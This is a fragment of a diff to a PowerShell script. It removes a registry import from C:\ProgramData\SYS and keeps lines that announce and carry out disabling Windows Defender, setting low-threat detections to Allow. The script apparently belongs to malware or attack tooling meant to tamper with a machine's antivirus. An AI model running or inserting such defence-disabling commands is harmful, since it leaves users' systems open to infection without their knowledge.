@@ -1,5 +1,3 @@
-cd C:\ProgramData\SYS
-reg import dn.reg
 cd C:\Windows\system32
 Write-Host "[+] Disable Windows Defender (as $(whoami))"
 Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
